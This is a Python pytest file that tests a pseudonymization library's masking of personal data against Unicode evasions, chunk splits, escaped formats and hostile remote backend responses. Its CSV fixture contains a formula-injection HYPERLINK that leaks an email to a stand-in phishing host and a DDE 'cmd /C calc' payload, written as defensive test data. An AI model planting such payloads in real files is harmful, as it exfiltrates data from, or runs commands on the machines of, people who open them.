import json
from pathlib import Path
from typing import Any

import pytest
import respx

from pseudonymize import (
    Policy,
    Pseudonymizer,
    TextOffsetLocation,
)
from pseudonymize.backends.remote import HTTPRemoteBackend
from pseudonymize.document import ContentBlock, Document
from pseudonymize.exceptions import BackendExecutionError, InvalidDetectionError
from pseudonymize.policy import NetworkPolicy
from pseudonymize.result import EntityType

pytestmark = pytest.mark.integration


# ---------------------------------------------------------------------------
# 1. Unicode Normalization, Zero-Width Characters & Bidirectional Controls
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw_text", "expected_masked", "leak_strings"),
    [
        # Soft hyphen embedded in email address
        (
            "Contact user\u00adname@example.com for account details.",
            "Contact <EML_1> for account details.",
            ("username@example.com", "user\u00adname@example.com"),
        ),
        # Zero-width non-joiner (ZWNJ) inside local part of email
        (
            "Send an email to sneaky\u200c@example.com immediately.",
            "Send an email to <EML_1> immediately.",
            ("sneaky@example.com", "sneaky\u200c@example.com"),
        ),
        # Zero-width space (ZWSP) inside an IPv4 address
        (
            "Target host is 192.168.\u200b1.1 in internal subnet.",
            "Target host is <IP_1> in internal subnet.",
            ("192.168.1.1", "192.168.\u200b1.1"),
        ),
        # Right-to-left override (\u202e) embedded inside an email
        (
            "Check mar\u202eia@example.com in database.",
            "Check <EML_1> in database.",
            ("maria@example.com", "mar\u202eia@example.com"),
        ),
        # Bidirectional isolate (\u2066) embedded inside an email
        (
            "Reach out to adm\u2066in@example.org promptly.",
            "Reach out to <EML_1> promptly.",
            ("admin@example.org", "adm\u2066in@example.org"),
        ),
        # Right-to-left override and directional pop surrounding email
        (
            "Verify \u202emaria@example.com\u202c securely.",
            "Verify \u202e<EML_1>\u202c securely.",
            ("maria@example.com",),
        ),
        # Word joiner (\u2060) inside a phone number
        (
            "Call direct line +39\u2060 333 123 4567 for support.",
            "Call direct line +<PHN_1> for support.",
            ("+39 333 123 4567", "+39\u2060 333 123 4567"),
        ),
    ],
    ids=[
        "soft-hyphen-email",
        "zwnj-email",
        "zwsp-ip",
        "bidi-override-inside-email",
        "bidi-isolate-inside-email",
        "bidi-override-surrounding-email",
        "word-joiner-phone",
    ],
)
def test_security_corpus_unicode_controls_and_evasions(
    raw_text: str, expected_masked: str, leak_strings: tuple[str, ...]
) -> None:
    engine = Pseudonymizer()
    result = engine.process(raw_text)

    assert result.text == expected_masked
    for leak in leak_strings:
        assert leak not in result.text

    # Value-safe diagnostics: verify reports do not embed raw sensitive plaintext in tokens
    report_result = engine.process_with_report(raw_text)
    assert len(report_result.detections) == 1
    detection = report_result.detections[0]
    for leak in leak_strings:
        assert leak not in str(detection.token)
        assert leak not in repr(detection)


# ---------------------------------------------------------------------------
# 2. Deeply Nested Payloads & Structured Data Boundaries
# ---------------------------------------------------------------------------


def test_security_corpus_deeply_nested_payload() -> None:
    engine = Pseudonymizer()

    nested_payload: dict[str, Any] = {
        "metadata": {"system_id": 999, "active": True, "ratio": 3.14},
        "tenants": [
            {
                "id": "tenant-abc",
                "clusters": {
                    "eu-central": {
                        "primary_admin": "superadmin@example.org",
                        "gateway_ip": "10.0.0.1",
                        "tags": ["prod", "tier-1", None, False],
                        "contact_chain": [
                            {"tier": 1, "email": "tier1-ops@example.org"},
                            {"tier": 2, "email": "tier2-lead@example.org"},
                        ],
                    }
                },
            }
        ],
    }

    result = engine.process_data(nested_payload)
    expected_payload: dict[str, Any] = {
        "metadata": {"system_id": 999, "active": True, "ratio": 3.14},
        "tenants": [
            {
                "id": "tenant-abc",
                "clusters": {
                    "eu-central": {
                        "primary_admin": "<EML_1>",
                        "gateway_ip": "<IP_1>",
                        "tags": ["prod", "tier-1", None, False],
                        "contact_chain": [
                            {"tier": 1, "email": "<EML_2>"},
                            {"tier": 2, "email": "<EML_3>"},
                        ],
                    }
                },
            }
        ],
    }

    assert result == expected_payload

    # Ensure sensitive values are completely expunged
    serialized = json.dumps(result)
    assert "superadmin@example.org" not in serialized
    assert "tier1-ops@example.org" not in serialized
    assert "tier2-lead@example.org" not in serialized
    assert "10.0.0.1" not in serialized


# ---------------------------------------------------------------------------
# 3. Streaming Splits & Cross-Chunk Boundaries
# ---------------------------------------------------------------------------


def test_security_corpus_streaming_chunk_splits() -> None:
    engine = Pseudonymizer()

    # Split an email address, an IPv4 address, and an IBAN across artificial chunk boundaries
    chunks = [
        "Please send the monthly invoice to info.",
        "billing@",
        "secure-domain.example.com immediately. ",
        "The gateway host is located at 192.",
        "168.1.",
        "100 on subnet. ",
        "Transfer settlement funds to IBAN GB82",
        " WEST 1234 5698",
        " 7654 32, confirmed by end of day.",
    ]

    streamed_output = "".join(engine.process_stream(chunks))

    # All split entities must be detected and masked correctly
    assert "<EML_1>" in streamed_output
    assert "<IP_1>" in streamed_output
    assert "<IBN_1>" in streamed_output

    assert "info.billing@secure-domain.example.com" not in streamed_output
    assert "192.168.1.100" not in streamed_output
    assert "GB82 WEST 1234 5698 7654 32" not in streamed_output


# ---------------------------------------------------------------------------
# 4. Escaped & Encoded Structured Boundaries (JSON, CSV, Formulas)
# ---------------------------------------------------------------------------


def test_security_corpus_json_and_csv_boundary_escapes(tmp_path: Path) -> None:
    engine = Pseudonymizer()

    # 4a. JSON with escaped characters and Unicode escapes
    json_path = tmp_path / "escaped.json"
    json_content = {
        "escaped_email": 'first\\"middle\\"@example.com',
        "unicode_email": "\u006d\u0061\u0072\u0069\u0061@example.com",
        "nested_note": "User note with raw text: contact me at direct@example.org for help.",
    }
    json_path.write_text(json.dumps(json_content), encoding="utf-8")

    out_json_path = tmp_path / "escaped.safe.json"
    engine.process_file(json_path, out_json_path)

    transformed_json = json.loads(out_json_path.read_text(encoding="utf-8"))
    assert transformed_json["unicode_email"] == "<EML_1>"
    assert (
        transformed_json["nested_note"]
        == "User note with raw text: contact me at <EML_2> for help."
    )
    assert "maria@example.com" not in out_json_path.read_text(encoding="utf-8")
    assert "direct@example.org" not in out_json_path.read_text(encoding="utf-8")

    # 4b. CSV with embedded formula injection and multiline quoting
    csv_path = tmp_path / "formula.csv"
    csv_raw = (
        "id,formula_cell\n"
        '1,"=HYPERLINK(""https://phishing.example.com?leak="" & '
        '""secret-user@example.com"", ""click"")"\n'
        "2,\"-2+5+cmd|' /C calc'!A0 maria@example.com\"\n"
    )
    csv_path.write_text(csv_raw, encoding="utf-8")

    out_csv_path = tmp_path / "formula.safe.csv"
    engine.process_file(csv_path, out_csv_path)

    transformed_csv = out_csv_path.read_text(encoding="utf-8")
    assert "<EML_1>" in transformed_csv
    assert "<EML_2>" in transformed_csv
    assert "secret-user@example.com" not in transformed_csv
    assert "maria@example.com" not in transformed_csv


# ---------------------------------------------------------------------------
# 5. Document Metadata Isolation & Value-Safe Error Handling
# ---------------------------------------------------------------------------


def test_security_corpus_document_metadata_and_location_safety() -> None:
    # Metadata values must not leak in repr and must be validated
    block = ContentBlock("block-1", "Notice sent to user@example.com.", TextOffsetLocation(0, 33))
    doc = Document(
        id="doc-1",
        blocks=(block,),
        metadata={"author": "Internal Audit", "retention_days": 30, "sensitive_tag": "RESTRICTED"},
    )

    # Document string representation must not dump raw content or leak plaintext
    assert "user@example.com" not in repr(doc)

    # Invalid metadata scalar rejection must not leak raw input
    with pytest.raises(TypeError, match="metadata values must be JSON scalars"):
        Document(
            id="doc-2",
            blocks=(block,),
            metadata={"bad_object": object()},  # type: ignore[dict-item]
        )


# ---------------------------------------------------------------------------
# 6. Hostile Remote Responses
# ---------------------------------------------------------------------------


def test_security_corpus_hostile_remote_out_of_bounds_offsets() -> None:
    endpoint = "https://remote.validator.example.com/detect"
    backend = HTTPRemoteBackend(
        name="hostile_backend",
        endpoint=endpoint,
        entity_types=frozenset({EntityType.EMAIL}),
    )
    policy = Policy(
        entity_types=frozenset({EntityType.EMAIL}),
        network_policy=NetworkPolicy.ALLOW_CONFIGURED,
        allowed_remote_backends=frozenset({"hostile_backend"}),
    )
    engine = Pseudonymizer(backends=[backend], policy=policy)

    content = "Email is maria@example.com here."

    with respx.mock:
        # Case A: Remote backend returns end offset exceeding block length
        respx.post(endpoint).respond(
            status_code=200,
            json={
                "detections": [
                    {
                        "entity_type": "EMAIL",
                        "start": 0,
                        "end": 999999,  # Out of bounds
                        "confidence": 0.99,
                    }
                ]
            },
        )
        with pytest.raises(InvalidDetectionError, match="offsets outside the content block"):
            engine.process(content)


def test_security_corpus_hostile_remote_inverted_and_negative_spans() -> None:
    endpoint = "https://remote.validator.example.com/detect"
    backend = HTTPRemoteBackend(
        name="hostile_backend",
        endpoint=endpoint,
        entity_types=frozenset({EntityType.EMAIL}),
    )
    policy = Policy(
        entity_types=frozenset({EntityType.EMAIL}),
        network_policy=NetworkPolicy.ALLOW_CONFIGURED,
        allowed_remote_backends=frozenset({"hostile_backend"}),
    )
    engine = Pseudonymizer(backends=[backend], policy=policy)

    content = "Email is maria@example.com here."

    with respx.mock:
        # Case B: Inverted interval (end < start) and negative interval (start < 0)
        respx.post(endpoint).respond(
            status_code=200,
            json={
                "detections": [
                    {"entity_type": "EMAIL", "start": 15, "end": 5, "confidence": 0.9},
                    {"entity_type": "EMAIL", "start": -10, "end": 10, "confidence": 0.9},
                ]
            },
        )
        # Backend safely filters invalid Detection instances, returning 0 valid candidates
        result = engine.process(content)
        assert result.text == content


def test_security_corpus_hostile_remote_server_error_sanitization() -> None:
    endpoint = "https://remote.validator.example.com/detect"
    secret_token = "SUPER_SECRET_BEARER_TOKEN_99999"
    backend = HTTPRemoteBackend(
        name="hostile_backend",
        endpoint=endpoint,
        entity_types=frozenset({EntityType.EMAIL}),
        auth_token=secret_token,
    )
    policy = Policy(
        entity_types=frozenset({EntityType.EMAIL}),
        network_policy=NetworkPolicy.ALLOW_CONFIGURED,
        allowed_remote_backends=frozenset({"hostile_backend"}),
    )
    engine = Pseudonymizer(backends=[backend], policy=policy)

    sensitive_content = "Confidential text for maria@example.com."

    with respx.mock:
        # Case C: 500 error containing internal server trace and reflected token
        respx.post(endpoint).respond(
            status_code=500,
            text=(
                "<html>Traceback: Leaked token SUPER_SECRET_BEARER_TOKEN_99999 "
                "for maria@example.com</html>"
            ),
        )

        with pytest.raises(
            BackendExecutionError, match="backend failed during detection"
        ) as exc_info:
            engine.process(sensitive_content)

        # Verification: neither sensitive plaintext nor token may leak in exception string or repr
        err_str = str(exc_info.value)
        err_repr = repr(exc_info.value)
        cause_str = str(exc_info.value.__cause__)
        assert secret_token not in err_str
        assert secret_token not in err_repr
        assert secret_token not in cause_str
        assert "maria@example.com" not in err_str
        assert "maria@example.com" not in err_repr
        assert "maria@example.com" not in cause_str
        assert "remote response was unsuccessful" in cause_str


def test_security_corpus_hostile_remote_redirect_blocking() -> None:
    endpoint = "https://remote.validator.example.com/detect"
    backend = HTTPRemoteBackend(
        name="hostile_backend",
        endpoint=endpoint,
        entity_types=frozenset({EntityType.EMAIL}),
    )
    policy = Policy(
        entity_types=frozenset({EntityType.EMAIL}),
        network_policy=NetworkPolicy.ALLOW_CONFIGURED,
        allowed_remote_backends=frozenset({"hostile_backend"}),
    )
    engine = Pseudonymizer(backends=[backend], policy=policy)

    with respx.mock:
        # Case D: Malicious 307 redirect to internal loopback
        respx.post(endpoint).respond(
            status_code=307,
            headers={"Location": "http://127.0.0.1:8080/internal-leak"},
        )

        with pytest.raises(
            BackendExecutionError, match="backend failed during detection"
        ) as exc_info:
            engine.process("Plaintext data.")

        assert "127.0.0.1" not in str(exc_info.value)
        assert "127.0.0.1" not in str(exc_info.value.__cause__)
